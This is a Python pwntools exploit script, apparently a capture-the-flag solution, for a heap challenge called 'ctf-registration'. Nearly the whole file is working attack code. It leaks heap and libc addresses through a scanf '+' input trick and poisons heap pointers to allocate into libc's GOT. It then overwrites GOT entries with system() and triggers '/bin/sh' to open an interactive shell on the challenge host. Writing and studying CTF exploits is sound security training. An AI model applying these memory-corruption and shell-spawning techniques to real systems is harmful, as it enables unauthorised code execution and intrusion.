#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "ctf-registration.chal.wwctf.com"
PORT = 1337
PROCESS = "./chall"


def register(age, name, desc):
    r.sendline(b"1")
    if (age == -1):
        r.sendlineafter(b"? ", b"+")
    else:
        r.sendlineafter(b"? ", str(age).encode())

    r.sendlineafter(b"? ", name)
    r.sendlineafter(b"? ", desc)
    r.recvuntil(b">> ")


def view(idx):
    r.sendline(b"2")
    r.sendlineafter(b"? ", str(idx).encode())
    r.recvline()
    r.recvuntil(b"Name: ")
    name = r.recvline()[:-1]
    r.recvuntil(b"Age: ")
    age = int(r.recvline()[:-1], 10)
    r.recvuntil(b"Description: ")
    desc = r.recvuntil(b"\n====", drop=True)
    r.recvuntil(b">> ")
    return name, age, desc


def exploit(r):
    r.recvuntil(b">> ")

    # leak heap base with scanf +
    register(-1, b"A" * 16, b"A" * 0x10)            # 0
    register(-1, b"A" * 16, b";/bin/sh;\x00")       # 1

    _, HEAPLEAK, _ = view(1)
    HEAPBASE = HEAPLEAK - 0xe0

    ASLR = False

    if not HEAPBASE == 0x7fffe0000000:
        ASLR = True

    log.info("HEAP leak    : %s" % hex(HEAPLEAK))
    log.info("HEAP base    : %s" % hex(HEAPBASE))

    # overwrite LSB of next ptr with 0x00
    payload = p64(HEAPBASE + 0x28) + p64(HEAPBASE + 0x28)
    payload += p64(HEAPBASE + 0x28) + p64(HEAPBASE + 0x28)

    register(-1, b"A" * 8, payload)                 # 2
    register(-1, b"D" * 8, b"E" * 0x20)             # 3
    register(-1, b"F" * 8, b"G" * 0x20)             # 4

    # allocate into heap main and leak
    register(-1, b"X" * 8, b"B" * 0x20)             # 5

    _, HEAPMAIN, _ = view(5)

    log.info("HEAP main    : %s" % hex(HEAPMAIN))

    if ASLR:
        if not LOCAL:
            libc.address = HEAPMAIN - 0x262000 - 0x2000
        else:
            libc.address = HEAPMAIN - 0x262000
    else:
        libc.address = HEAPMAIN - 0x268000

    log.info("LIBC base    : %s" % hex(libc.address))

    # allocate into libc abs.got
    TARGET = libc.address + 0x21a080  # 0x7ffff7fac080

    payload = p64(TARGET) + p64(TARGET)
    payload += p64(TARGET) + p64(TARGET)

    register(0xdeadbeef, b"X" * 8, payload)
    TARGET2 = libc.symbols["system"]

    payload = p64(TARGET2) + p64(TARGET2)
    payload += p64(TARGET2) + p64(TARGET2)
    register(0xdeadbeef, b"AAAA", payload)

    r.sendline(b"2")
    r.sendline(b"1")

    r.interactive()

    return


if __name__ == "__main__":
    libc = ELF("./libc.so.6")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process("./chall")
        print(util.proc.pidof(r))
        pause()

    exploit(r)
